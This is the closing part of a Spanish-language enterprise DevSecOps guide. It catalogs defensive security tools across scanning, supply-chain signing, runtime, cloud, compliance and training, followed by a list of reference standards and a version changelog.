| **TruffleHog** | OSS + Commercial | Deep secret scanning + verification | ✅ | https://trufflesecurity.com/ |
| **GitHub Secret Scanning** | Gratis (GitHub) | Detecta secrets conocidos en repo | ✅ nativo | https://docs.github.com/code-security |

### 26.6 Container Scanning

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Grype** | OSS (Anchore) | CVE scan de imágenes | ✅ | https://github.com/anchore/grype |
| **Trivy** | OSS | Container + SBOM + IaC | ✅ | https://trivy.dev/ |
| **Snyk Container** | Commercial | Container + base image fixing | ✅ | https://snyk.io/ |

### 26.7 IaC Scanning

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Checkov** | OSS (Bridgecrew) | Terraform/CloudFormation/K8s policy | ✅ | https://www.checkov.io/ |
| **tfsec** | OSS | Terraform security | ✅ | https://github.com/aquasecurity/tfsec |
| **KICS** | OSS (Checkmarx) | Multi-IaC scanning | ✅ | https://kics.io/ |
| **Semgrep IaC** | OSS | IaC + SAST unificado | ✅ | https://semgrep.dev/ |

### 26.8 License Compliance + SBOM

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **FOSSA** | Commercial | License + vulnerability compliance | ✅ | https://fossa.com/ |
| **ScanCode** | OSS | License detection | ✅ | https://github.com/nexB/scancode-toolkit |
| **Syft** | OSS (Anchore) | Generación SBOM (CycloneDX/SPDX) | ✅ | https://github.com/anchore/syft |
| **anchore/sbom-action** | OSS | SBOM en GitHub Actions | ✅ | https://github.com/anchore/sbom-action |
| **CycloneDX** | OSS (OWASP) | Estándar + tooling SBOM | ✅ | https://cyclonedx.org/ |
| **SPDX** | OSS (LF) | Estándar SBOM | ✅ | https://spdx.dev/ |

### 26.9 Supply Chain / Signing

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **cosign** | OSS (Sigstore) | Firma/verificación de artifacts | ✅ | https://github.com/sigstore/cosign |
| **Fulcio** | OSS | CA rootless (certificados OIDC) | ✅ | https://github.com/sigstore/fulcio |
| **Rekor** | OSS | Transparency log | ✅ | https://github.com/sigstore/rekor |
| **slsa-github-generator** | OSS | SLSA provenance en GH Actions | ✅ | https://github.com/slsa-framework/slsa-github-generator |
| **slsa-verifier** | OSS | Verificación de provenance | ✅ | https://github.com/slsa-framework/slsa-verifier |
| **OpenSSF Scorecard** | OSS | Puntuación de seguridad de repos | ✅ | https://securityscorecards.dev/ |

### 26.10 Runtime Security

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Falco** | OSS (CNCF) | Runtime security K8s/containers | ⚠️ (runtime) | https://falco.org/ |
| **Tetragon** | OSS (Cilium) | eBPF-based runtime security | ⚠️ (runtime) | https://tetragon.io/ |
| **tracee** | OSS (Aqua) | Runtime tracing de syscalls | ⚠️ (runtime) | https://aquasecurity.github.io/tracee/ |
| **Cilium** | OSS (CNCF) | Networking + eBPF + Hubble | ✅ (mesh) | https://cilium.io/ |

### 26.11 RASP

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Datadog ASM** | Commercial | RASP + ASM | ✅ | https://www.datadoghq.com/ |
| **Contrast** | Commercial | RASP + IAST | ✅ | https://www.contrastsecurity.com/ |

### 26.12 Kubernetes Policy

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **OPA Gatekeeper** | OSS (CNCF) | Policy-as-Code admission | ✅ | https://open-policy-agent.github.io/gatekeeper/ |
| **Kyverno** | OSS (CNCF) | Policy nativa K8s (YAML) | ✅ | https://kyverno.io/ |
| **Sigstore policy-controller** | OSS | Verify signatures en admission | ✅ | https://docs.sigstore.dev/policy-controller/ |
| **Istio** | OSS (CNCF) | Service mesh + mTLS | ✅ | https://istio.io/ |
| **Linkerd** | OSS (CNCF) | Service mesh ligero + mTLS | ✅ | https://linkerd.io/ |

### 26.13 Cloud AWS

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **GuardDuty** | Commercial (AWS) | Threat detection | ✅ | https://aws.amazon.com/guardduty/ |
| **Security Hub** | Commercial (AWS) | Posture + aggregation | ✅ | https://aws.amazon.com/security-hub/ |
| **Inspector** | Commercial (AWS) | Vuln scan de workloads | ✅ | https://aws.amazon.com/inspector/ |
| **Macie** | Commercial (AWS) | PII/classification | ✅ | https://aws.amazon.com/macie/ |
| **Config** | Commercial (AWS) | Compliance drift | ✅ | https://aws.amazon.com/config/ |
| **CloudTrail** | Commercial (AWS) | Audit trail API | ✅ | https://aws.amazon.com/cloudtrail/ |
| **KMS** | Commercial (AWS) | Key management | ✅ | https://aws.amazon.com/kms/ |
| **Secrets Manager** | Commercial (AWS) | Secret rotation | ✅ | https://aws.amazon.com/secrets-manager/ |

### 26.14 Secret Management (General)

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **HashiCorp Vault** | OSS + Commercial | Secrets + dynamic secrets + K/V | ✅ | https://www.vaultproject.io/ |
| **Doppler** | Commercial | Secret management multi-env | ✅ | https://www.doppler.com/ |
| **Infisical** | OSS + Commercial | Secret management open source | ✅ | https://infisical.com/ |

### 26.15 Incident Response

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **PagerDuty** | Commercial | On-call + escalation | ⚠️ | https://www.pagerduty.com/ |
| **Opsgenie** | Commercial (Atlassian) | On-call + alerting | ⚠️ | https://www.atlassian.com/software/opsgenie |
| **incident.io** | Commercial | IR management + postmortems | ⚠️ | https://incident.io/ |
| **Rootly** | Commercial | IR automation | ⚠️ | https://www.rootly.com/ |

### 26.16 Compliance

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Vanta** | Commercial | SOC 2/ISO automation | ✅ | https://www.vanta.com/ |
| **Drata** | Commercial | SOC 2/ISO automation | ✅ | https://drata.com/ |
| **Secureframe** | Commercial | Compliance automation | ✅ | https://secureframe.com/ |
| **AWS Audit Manager** | Commercial (AWS) | Evidence collection | ✅ | https://aws.amazon.com/audit-manager/ |

### 26.17 Training

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **SecureFlag** | Commercial | Hands-on secure coding | — | https://secureflag.com/ |
| **Snyk Learn** | Freemium | Security lessons interactivas | — | https://learn.snyk.io/ |
| **Kontra** | Commercial | Secure coding training | — | https://application.security/ |
| **HackTheBox** | Freemium | CTF + labs | — | https://www.hackthebox.com/ |
| **TryHackMe** | Freemium | CTF + learning paths | — | https://tryhackme.com/ |

---

## 27. Referencias y Fuentes

### NIST (National Institute of Standards and Technology)

- NIST CSF 2.0 (CSWP 29, 2024): https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf
- NIST SP 800-207 (Zero Trust Architecture): https://csrc.nist.gov/pubs/sp/800/207/final
- NIST SP 800-218 (SSDF — Secure Software Development Framework): https://csrc.nist.gov/pubs/sp/800/218/final
- NIST SP 800-61 r2 (Computer Security Incident Handling): https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
- NIST SP 800-53 r5 (Security Controls): https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final

### OWASP

- OWASP Top 10 (2021): https://owasp.org/www-project-top-ten/
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP ASVS (Application Security Verification Standard): https://owasp.org/www-project-application-security-verification-standard/
- OWASP SAMM (Software Assurance Maturity Model): https://owasp.org/www-project-samm/
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/
- OWASP Threat Modeling: https://owasp.org/www-community/Threat_Modeling
- OWASP ZAP: https://www.zaproxy.org/

### SLSA (Supply-chain Levels for Software Artifacts)

- SLSA Spec v1.0: https://slsa.dev/spec/v1.0/
- SLSA Levels: https://slsa.dev/spec/v1.0/levels
- SLSA What's New (v1.0): https://slsa.dev/spec/v1.0/whats-new
- slsa-github-generator: https://github.com/slsa-framework/slsa-github-generator

### Sigstore

- Sigstore docs: https://docs.sigstore.dev/
- cosign: https://github.com/sigstore/cosign
- Fulcio: https://github.com/sigstore/fulcio
- Rekor: https://github.com/sigstore/rekor
- policy-controller: https://docs.sigstore.dev/policy-controller/

### SBOM

- CycloneDX (OWASP) 1.6: https://cyclonedx.org/
- CycloneDX 1.6 Release: https://cyclonedx.org/news/cyclonedx-v1.6-released/
- SPDX 3.0 (Linux Foundation): https://spdx.dev/
- NTIA Minimum Elements for SBOM: https://www.ntia.gov/sites/default/files/publications/ntia_sbom_framing_2_2020.pdf

### CIS (Center for Internet Security)

- CIS Controls v8: https://www.cisecurity.org/controls/v8
- CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks

### MITRE

- MITRE ATT&CK: https://attack.mitre.org/
- MITRE D3FEND: https://d3fend.mitre.org/
- MITRE CAPEC: https://capec.mitre.org/

### CISA

- KEV (Known Exploited Vulnerabilities Catalog): https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Zero Trust Maturity Model: https://www.cisa.gov/zero-trust-maturity-model
- SBOM Resources: https://www.cisa.gov/sbom

### ISO / Standards Bodies

- ISO/IEC 27001: https://www.iso.org/standard/27001
- ISO/IEC 27002:2022: https://www.iso.org/standard/75652.html
- AICPA SOC 2 (TSC): https://aipca.soc2.co/

### OpenSSF (Open Source Security Foundation)

- OpenSSF Scorecard: https://securityscorecards.dev/
- OpenSSF Best Practices Badge: https://bestpractices.coreinfrastructure.org/
- OpenSSF Sigstore: https://openssf.org/projects/sigstore/

### FIRST (Forum of Incident Response and Security Teams)

- CVSS v4.0: https://www.first.org/cvss/
- EPSS (Exploit Prediction Scoring System): https://www.first.org/epss/

### Government & Regulatory

- FedRAMP: https://www.fedramp.gov/
- PCI DSS (PCI SSC): https://www.pcisecuritystandards.org/
- HHS HIPAA: https://www.hhs.gov/hipaa/index.html
- EU GDPR: https://gdpr-info.eu/

### GitHub / AWS (Herramientas específicas)

- GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- AWS IAM OIDC Federation: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html
- AWS GuardDuty: https://aws.amazon.com/guardduty/
- Falco (CNCF): https://falco.org/

---

## Changelog

| Versión | Fecha | Cambios | Autores |
|---------|-------|---------|---------|
| 1.0 | 2026-08-02 | Documento creado. Investiga y sintetiza marcos enterprise (NIST CSF 2.0, SLSA v1.0, OWASP API Top 10 2023, sigstore, CycloneDX 1.6, SPDX 3.0), threat modeling, SSDLC, Zero Trust, IAM, seguridad API/Node/React/PostgreSQL, criptografía, secret management, AST family, CI/CD security, runtime, cloud AWS, container/K8s, vuln management, incident response, compliance, secure coding, cultura DevSecOps, roadmap madurez y catálogo de herramientas. Complementa SECURITY.md, security-design.md, segremp-rules.md y cicd-estado-actual.md + cicd-plan-implementacion.md. | @researcher (investigación), @developer (escritura parcial), @orchestrator (completado) |

> Documento vivo. Próxima revisión: Q4 2026 o ante cambio mayor en estándares (NIST, OWASP, SLSA).